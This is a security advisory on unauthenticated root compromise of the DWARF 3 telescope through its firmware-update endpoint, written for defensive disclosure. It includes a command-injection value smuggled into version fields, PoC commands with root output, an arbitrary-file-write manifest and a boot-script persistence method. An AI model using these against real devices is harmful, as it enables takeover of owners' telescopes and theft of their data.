# DWARF 3: unauthenticated root compromise through the OTA update endpoint

The DWARF 3 smart telescope runs an HTTP API on TCP 8082 with no
authentication. One of its endpoints, `/uploadFirmwareDiff`, accepts a firmware
package from anyone who can reach the device and does not verify that the
package came from the vendor. I found two ways to abuse it: you can write a
file anywhere on the filesystem as root, and you can get command execution as
root. Both are confirmed on hardware.

All testing was done on a DWARF 3 I own, on an isolated network.

## What is affected

| | |
|---|---|
| Vendor | DwarfLab |
| Product | DWARF 3 smart telescope |
| Component | `magni`, the main application daemon (ARM aarch64). HTTP API on TCP 8082 |
| Confirmed | firmware 1.5.4.3 on the device under test |
| Analysed | the published 1.5.4.1 firmware package |
| Probably affected | all of 1.5.4.x, and most likely earlier builds too, since the endpoint is older than these versions |
| Fixed in | nothing yet, as far as I know |
| Access needed | network access to the device. It runs its own Wi-Fi AP by default and is usually also joined to a home network |
| Credentials needed | none |
| User interaction | none |

## Issues

| # | Issue | CWE |
|---|---|---|
| 1 | Command injection through the OTA version fields, giving root RCE | CWE-78 |
| 2 | Arbitrary file write as root through `target_path`, with optional chmod +x | CWE-73, CWE-22 |
| 3 | No authentication and no signature check on firmware updates | CWE-306, CWE-347 |
| 4 | A failed update reports success | CWE-393, CWE-252 |
| 5 | Anyone can inflate the stored firmware version and block future updates | CWE-306 |

Issues 1, 2 and 3 are each enough on their own to take over the device.

## Relationship to my earlier finding

I previously reported a path traversal in this same endpoint against firmware
1.4.7.5, where `fileName` could contain `../` and overwrite `/etc/vsftpd.conf`:
https://github.com/Jaarden/DWARF-3-Root-Exploit

That one is fixed in 1.5.4.x. The multipart `filename=` is now rejected if it
contains `/`, `\` or `..` (see `magni` at `0x841238` to `0x841360`), and the
JSON `fileName` goes through a whitelist that keeps only `[A-Za-z0-9._-]` and
turns everything else into `_` (`0x7f4b00`).

The issues below are different bugs in the same endpoint. The 1.5.4.x fix does
not stop any of them.

## How the endpoint works

The request is `multipart/form-data` with two parts:

* a field named `firmwareInfo` holding `{"data": { ... }}`, the update metadata
* a file part holding the firmware package (a ZIP)

The metadata is parsed at `0x8223e8` onwards and consists of:

```
deviceId  fileMd5  fullFileMd5  fileName  updateFileType  updateType
newVersion  oldVersion
```

`updateFileType` picks the install mode. A value of `1` means diff mode, where
the upload is handed to `bspatch` as a patch file. Values of `0`, `2` or `3`
mean full upgrade, where the upload is treated as the package and installed.

The install itself happens in `upgradeSoftwareLegacy`, reached from the request
handler at `0x7f63c8` through the thunk at `0x9b2dc0`. It builds shell commands
with string concatenation and runs them through
`posix_spawn("/bin/sh", ["-c", cmd])` at `0x9d2340` (`"/bin/sh"` at `0xd9aa40`,
`"-c"` at `0xd9aa48`):

```c
cmd = "cp " + src + " " + dst;            // 0x9b140c, the " " is at 0xda3680
cmd = "bspatch " + old + " " + new + ...  // 0x9b2464
```

One practical note for anyone reproducing this: the route strings are
XOR-obfuscated with a single byte in `.rodata`, so `/uploadFirmwareDiff` does
not show up in a plain `strings` dump. It sits at `0xd5e4b8` with key `0xc5`
and is registered at `0x7f1cb8`. That is obfuscation, not a security control.

## Issue 1: command injection through the version fields

CWE-78. CVSS v3.1 9.8 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`. Score it 8.8 with
`AV:A` instead if you treat Wi-Fi reachability as adjacent.

`newVersion` and `oldVersion` are taken straight from the request JSON and
concatenated into the command strings above without quoting. They do not go
through the sanitiser that `fileName` gets.

The version check at `0x9b0e04` only reads the numeric prefix, because the
parse at `0x9b5040` uses a stringstream and stops at the first non-digit. So a
value like:

```
1.5.4.19; id > /DWARF3/himom; #
```

passes the version check as `1.5.4.19`, and the rest ends up in the command:

```sh
cp <src> /usrdata/firmware/dwarf3_upgrade_firmware_v1.5.4.19; id > /DWARF3/himom; #.zip
```

`cp` runs, then the injected command runs, then `#` comments out the rest.

Reproduction:

```console
$ python3 dwarf3_targetpath_poc.py <ip> --target /DWARF3 \
      --inject-field new --inject 'id > /DWARF3/himom'
[*] POST http://<ip>:8082/uploadFirmwareDiff
[*] HTTP 200: { "code": -15 }

$ curl -s http://<ip>/DWARF3/himom
uid=0(root) gid=0(root)
```

The non-zero response code is misleading. The injected command has already run
by the time the install fails, so you get the error code and the execution.

Output comes back over the device's own webserver, which serves `/DWARF3` with
directory listing turned on. From `nginx.conf`:

```
location /DWARF3 { root /; autoindex on; }
```

`dwarf3_shell.py` wraps this into an interactive root shell.

## Issue 2: arbitrary file write as root

CWE-73 (external control of file name or path), also CWE-22.
CVSS v3.1 9.8 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`.

In full upgrade mode the package is extracted and each module directory (`iq`,
`bin`, `libs`, `config`, `mcu`, `model`) is checked for an `update.json`
manifest. That manifest is parsed at `0x9abf70` and looks like this:

```json
{ "fileInfo": [ { "name": "payload",
                  "target_path": "/any/absolute/path",
                  "is_directory": false,
                  "need_execute": 1 } ] }
```

`target_path` is attacker controlled and never validated. There is no
allowlist, no canonicalisation and no `realpath()` call anywhere in the
installer. The `".."` string at `0xd65990` is only referenced by the multipart
filename checks, never by the install code between `0x9a8000` and `0x9b3000`.
Setting `need_execute` to 1 makes the installer chmod +x the file it just
wrote.

Reproduction:

```console
$ python3 dwarf3_targetpath_poc.py <ip> --target /DWARF3 --update-file-type 0
[*] HTTP 200: { "code": 0 }
[+] installed: /DWARF3/poc_marker

$ curl -s http://<ip>/DWARF3/ | grep poc_marker
<a href="poc_marker">poc_marker</a>    01-Jan-2038 00:21    23
```

### Turning that into persistence

The vendor's own manifests already ship these two entries, so both are
documented install targets rather than anything exotic:

```json
{ "name": "run.sh",                 "target_path": "/usrdata", "need_execute": 1 }
{ "name": "usb_gadget_configfs.sh", "target_path": "/etc",     "need_execute": 1 }
```

`/usrdata/run.sh` is the boot script, and it calls
`/etc/usb_gadget_configfs.sh` as root on every boot. Overwriting either gives
you root execution that survives a reboot. If you reproduce this, append to the
original `usb_gadget_configfs.sh` rather than replacing `run.sh`. A broken
`run.sh` leaves the device with no network and no services.

## Issue 3: no authentication, no signature check

CWE-306 and CWE-347. CVSS v3.1 9.8 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`.

Three separate things are missing here.

The API on 8082 has no authentication at all. `magni` contains no
`Authorization`, `Bearer`, `WWW-Authenticate` or `Unauthorized` strings, and no
libhv request preprocessor is installed.

Firmware packages are not signed. There is no `EVP_DigestVerify`,
`ECDSA_verify`, `signature` or `pubkey` handling anywhere in the update path.

The only integrity check is an MD5 that the client supplies in the same request
(`fileMd5` and `fullFileMd5`). That catches corruption in transit and nothing
else. An attacker just computes the MD5 of their own package.

The result is that anyone who can reach the device can install any firmware
they like.

## Issue 4: a failed update reports success

CWE-393 and CWE-252. CVSS v3.1 5.3 `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L`.

In diff mode the patch command is built like this:

```
bspatch <old>.zip  /tmp/<new>.zip  /tmp/<new>.zip
            old       newfile          patchfile
```

`newfile` and `patchfile` are the same path, so bspatch truncates the patch
file while it is still reading it. The exit status is never checked and nothing
is logged about it. The handler then returns `code: 0` to the client while the
device log says:

```
[ERROR][upgradeSoftwareLegacy] Directory not found: iq
[ERROR][upgradeSoftwareLegacy] Directory not found: bin
...
[INFO][completeFirmwareUploadResponse] OTA response: code=0 stage=upgrade
```

A client cannot tell a failed update from a successful one, and the version
number gets committed either way.

## Issue 5: anyone can inflate the firmware version

CWE-306. CVSS v3.1 6.5 `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`.

Every accepted upload writes `newVersion` into
`/userdata/config/factory/firmware_version.json`, including uploads where the
install then fails. Nothing validates that value against anything.

Because the check at `0x9b0e04` rejects any package that is not strictly newer
than the stored version, you can set the stored version to something like
9.9.9.9 and the device will refuse every real vendor update from then on. No
credentials needed, and the only sign anything is wrong is the version string
the device reports.

My test device went from 1.5.4.3 to 1.5.4.18 over the course of this research,
purely from repeated uploads.

## The chain

```
POST /uploadFirmwareDiff            (TCP 8082, no auth)
  multipart/form-data
    part "firmwareInfo"  = {"data": {deviceId, fileMd5, fullFileMd5,
                                     fileName, updateFileType, updateType,
                                     newVersion, oldVersion}}
    part file            = ZIP package

  requirements:
    oldVersion must equal the device's current version
    newVersion must be strictly greater          (0x9b0e04)
    updateFileType must be 0, 2 or 3 for full upgrade
    the ZIP needs explicit directory entries for the six module dirs,
      because the libzip based extractor only mkdir()s for those

  then:
    [1] version fields land unquoted in a shell command  -> root RCE
    [2] target_path in <module>/update.json              -> arbitrary root write
        need_execute: 1                                  -> chmod +x, boot persistence
```

## Scripts

`dwarf3_targetpath_poc.py` is the single shot PoC for the file write and the
command injection. `dwarf3_shell.py` is an interactive root shell: it probes
for a working injection path, then sends each command you type as an OTA upload
and reads the output back off the webserver.

```bash
# file write, harmless marker
python3 dwarf3_targetpath_poc.py <ip> --target /DWARF3

# command injection
python3 dwarf3_targetpath_poc.py <ip> --inject-field new --inject 'id > /DWARF3/himom'
curl -s http://<ip>/DWARF3/himom

# interactive shell
python3 dwarf3_shell.py <ip>
```

Both are Python 3 with no dependencies outside the standard library.

The shell is not a tty. Each command is one OTA upload plus one HTTP GET, so
expect two to four seconds per command and do not expect `vi` or `top` to work.

## Impact

Someone on the same network as the device can, with no credentials:

* run arbitrary commands as root
* read and copy off all stored photos, video and configuration
* install a backdoor that survives reboot
* replace the firmware entirely, since nothing checks signatures
* permanently stop the device from accepting real updates

The DWARF 3 runs its own Wi-Fi access point by default and is commonly joined
to a home network as well, so being reachable is the normal state, not an edge
case.

## What should be fixed

1. Put authentication on the update endpoint. The whole 8082 API is open right
   now, but the OTA endpoint is the urgent one.
2. Sign firmware packages and check the signature against a vendor public key
   before writing any file or running any command. A client supplied MD5 is not
   an integrity control.
3. Stop building shell commands by concatenating strings. Use
   `posix_spawn` or `execve` with an argument vector, or at the very least
   shell quote every value that gets interpolated.
4. Validate `target_path`: resolve it with `realpath()` and reject anything
   that lands outside an explicit install root. Do the same for `name`.
5. Validate the version fields against something like `^\d+(\.\d+){3}$` and
   reject anything that does not match, instead of reading a numeric prefix and
   ignoring the rest.
6. Do not call bspatch with the same path for `newfile` and `patchfile`, check
   its exit status, and return an error when it fails.
7. Only write the new version number after the install has actually succeeded.

## Disclosure timeline

| Date | Event |
|---|---|
| TBD | Vendor notified |
| TBD | Vendor acknowledged |
| TBD | Fix released |
| TBD | Public disclosure |

Found and reported by Justin Aarden.

## Legal note

Everything here was tested against a DWARF 3 I own, on an isolated network. No
other devices were touched. This is published so the vendor can fix it and so
owners can understand the risk.
